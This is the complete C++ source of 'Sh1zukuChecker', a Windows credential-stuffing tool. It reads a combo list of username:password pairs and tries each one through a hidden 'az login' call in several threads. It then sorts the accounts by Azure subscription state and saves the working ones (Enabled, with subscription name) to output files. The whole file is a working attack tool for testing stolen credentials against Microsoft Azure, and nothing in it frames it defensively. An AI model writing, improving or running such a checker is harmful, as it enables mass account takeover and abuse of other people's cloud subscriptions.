#include <iostream>
#include <windows.h>
#include <string>
#include <direct.h>
#include <sstream>
#include <time.h>
#include <chrono>
#include <fstream>
#include <thread>
#include "json/json.h"
#pragma warning(disable:4996)

HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
int TimeoutMS = 0;
int SubCount = 0;
int NACount = 0;
int ExpriedCount = 0;
int CheckedCount = 0;
int ComboLines = 0;
int ThreadCount = 0;
std::string ErrorPassword("Error validating credentials due to invalid username or password.");
std::string GoodAccount("AzureCloud");
std::string NotActive("N/A(tenant level account)");
std::string Expried("The password is expired.");
std::string SaveFolder;
std::string ComboFile;
bool PrintBad = false;

std::string createFolder()
{
	std::string outputFolder("Output");
	if (_waccess((const wchar_t*)outputFolder.c_str(), 0) == -1)
	{
		_mkdir(outputFolder.c_str());
	}
	auto now = std::chrono::system_clock::now();
	uint64_t dis_millseconds = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count()
		- std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count() * 1000;
	time_t tt = std::chrono::system_clock::to_time_t(now);
	auto time_tm = localtime(&tt);
	char strTime[20];
	sprintf(strTime, "%d%02d%02d%02d%02d%02d", time_tm->tm_year + 1900,
		time_tm->tm_mon + 1, time_tm->tm_mday, time_tm->tm_hour,
		time_tm->tm_min, time_tm->tm_sec);
	std::string time(strTime);
	std::string folderName("Output\\");
	folderName = folderName + time;
	_mkdir(folderName.c_str());
	return folderName;
}

std::string cmdProcess(const std::string& cmdLine) {
	SECURITY_ATTRIBUTES _security = { 0 };
	_security.bInheritHandle = TRUE;
	_security.nLength = sizeof(_security);
	_security.lpSecurityDescriptor = NULL;
	HANDLE hRead = NULL, hWrite = NULL;
	if (!CreatePipe(&hRead, &hWrite, &_security, 0)) {
		exit(10001);
	}
	int convLength = MultiByteToWideChar(CP_UTF8, 0, cmdLine.c_str(), (int)strlen(cmdLine.c_str()), NULL, 0);
	if (convLength <= 0) {
		exit(10002);
	}
	std::wstring wCmdLine;
	wCmdLine.resize(convLength + 10);
	convLength = MultiByteToWideChar(CP_UTF8, 0, cmdLine.c_str(), (int)strlen(cmdLine.c_str()), &wCmdLine[0], (int)wCmdLine.size());
	if (convLength <= 0) {
		exit(10003);
	}
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	if (!CreateProcess(NULL, &wCmdLine[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		exit(10004);
	}
	DWORD dw = WaitForSingleObject(pi.hProcess, TimeoutMS);
	if (dw == WAIT_TIMEOUT) {
		return std::string("Error");
	}
	DWORD bufferLen = 10240;
	char* buffer = (char*)malloc(10240);
	memset(buffer, '\0', bufferLen);
	DWORD recLen = 0;
	if (!ReadFile(hRead, buffer, bufferLen, &recLen, NULL)) {
		exit(10005);
	}
	std::string ret(buffer);
	CloseHandle(hRead);
	CloseHandle(hWrite);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	free(buffer);
	return ret;
}

int countLines(char* filename)
{
	std::ifstream ReadFile;
	int n = 0;
	std::string tmp;
	ReadFile.open(filename, std::ios::in);
	if (ReadFile.fail())
	{
		return 0;
	}
	else
	{
		while (getline(ReadFile, tmp, '\n'))
		{
			n++;
		}
		ReadFile.close();
		return n;
	}
}

void setTitle() {
	std::string Title = "Sh1zukuChecker | Sub:" + std::to_string(SubCount) + " | NotActive:" + std::to_string(NACount) + " | Expried:" + std::to_string(ExpriedCount) + " | Checked:" + std::to_string(CheckedCount) + " of " + std::to_string(ComboLines);
	SetConsoleTitleA(Title.c_str());
}

void save(int Type, std::string text) {
	std::ofstream ofs;
	std::string SaveFile;
	if (Type == 0) {
		SaveFile = SaveFolder + "\\Enabled.txt";
	}
	else if (Type == 1) {
		SaveFile = SaveFolder + "\\Disabled.txt";
	}
	else if (Type == 2) {
		SaveFile = SaveFolder + "\\NotActive.txt";
	}
	else if (Type == 3) {
		SaveFile = SaveFolder + "\\Expried.txt";
	}
	else if (Type == 4) {
		SaveFile = SaveFolder + "\\Failed.txt";
	}
	ofs.open(SaveFile.c_str(), std::ios::out | std::ios::app);
	ofs << text << std::endl;
	ofs.close();
}

std::string readSpecificLine(const std::string& filename, int lineNumber) {
	std::ifstream file(filename);
	if (!file.is_open()) {
		return "Failed";
	}

	std::string line;
	for (int i = 1; i <= lineNumber; ++i) {
		if (!std::getline(file, line)) {
			file.close();
			return "Failed";
		}
	}
	file.close();
	return line;
}

void check(int ThreadId) {
	for (int i = 0; i < ComboLines; i++) {
		setTitle();
		int NowReadLine = ThreadId + 1 + i * ThreadCount;
		if (NowReadLine > ComboLines) {
			return;
		}
		else {
			std::string line = readSpecificLine(ComboFile, NowReadLine);
			int split = line.find(std::string(":"), 0);
			std::string account = line.substr(0, split);
			std::string password = line.substr(split + 1, line.length());
			std::string cmdLine1("cmd /c az login --allow-no-subscriptions --username ");
			std::string cmdLine2(" --password ");
			std::string cmdLine = cmdLine1 + account + cmdLine2 + password;
			std::string tmp = cmdProcess(cmdLine);
			int index = tmp.find(GoodAccount, 0);
			if (index > tmp.length()) {
				index = tmp.find(ErrorPassword, 0);
				if (index < tmp.length()) {
					if (PrintBad) {
						std::string output("[Bad]" + account + ":" + password);
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 4);
						std::cout << output << std::endl;
						save(4, output);
					}
				}
				else {
					index = tmp.find(Expried, 0);
					if (index < tmp.length()) {
						std::string output("[Expried]" + account + ":" + password);
						SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 9);
						std::cout << output << std::endl;
						save(3, output);
						ExpriedCount++;
					}
					else {
						if (PrintBad) {
							std::string output("[Error]" + account + ":" + password);
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 4);
							std::cout << output << std::endl;
							save(4, output);
						}
					}
				}
			}
			else {
				index = tmp.find(std::string("["), 0);
				std::string jsonData = tmp.substr(index, tmp.length());
				Json::Reader reader;
				Json::Value root;

				if (reader.parse(jsonData.c_str(), root)) {
					for (Json::Value::ArrayIndex i = 0; i != root.size(); i++) {
						std::string name = root[i]["name"].asString();
						std::string state = root[i]["state"].asString();
						if (name == NotActive) {
							std::string output("[NotActive]" + account + ":" + password);
							SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 9);
							std::cout << output << std::endl;
							save(2, output);
							NACount++;
						}
						else {
							if (state == std::string("Enabled")) {
								std::string output("[Enabled]" + account + ":" + password + " | " + name);
								SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 2);
								std::cout << output << std::endl;
								save(0, output);
								SubCount++;
							}
							else if (state == std::string("Warned")) {
								std::string output("[Warned]" + account + ":" + password);
								SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 11);
								std::cout << output << std::endl;
								save(1, output);
							}
							else {
								std::string output("[Disabled]" + account + ":" + password);
								SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 11);
								std::cout << output << std::endl;
								save(1, output);
							}
						}
					}
				}
			}
			CheckedCount++;
		}
	}
	return;
}

void readConfig() {
	std::ifstream ifs;
	std::string ConfigFileLoc = "config.json";
	ifs.open(ConfigFileLoc.c_str(), std::ios::in);
	if (!ifs.is_open())
	{
		std::cerr << "Cannot open config file!" << std::endl;
		system("pause");
		exit(10006);
	}
	else {
		Json::Reader reader;
		Json::Value root;
		ifs.seekg(0, std::ios_base::end);
		int length = ifs.tellg();
		ifs.seekg(std::ios_base::beg);
		char* buff = new char[length + 1]();
		ifs.read(buff, length + 1);
		std::string content(buff, length + 1);
		delete[] buff;

		if (reader.parse(content.c_str(), root)) {
			PrintBad = root["print_bad"].asBool();
			ThreadCount = root["thread"].asInt();
			TimeoutMS = root["timeout"].asInt();
		}
		else {
			std::cerr << "Cannot parse config file!" << std::endl;
			exit(10006);
		}
	}
}

int main(int argc, char* argv[]) {
	SetConsoleTitle(L"Sh1zukuChecker");
	std::cout << "Welcome To Sh1zuku Checker!!!" << std::endl;
	SaveFolder = createFolder();
	readConfig();
	std::cout << "Please input your combo file's location: ";
	std::getline(std::cin, ComboFile);
	ComboLines = countLines((char*)ComboFile.c_str());
	std::vector<std::thread> checkThreads;
	for (int i = 0; i < ThreadCount; i++)
	{
		checkThreads.push_back(std::thread(check, i));
	}
	for (auto iter = checkThreads.begin(); iter != checkThreads.end(); iter++)
	{
		iter->join();
	}
	SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | 7);
	system("pause");
	return 0;
}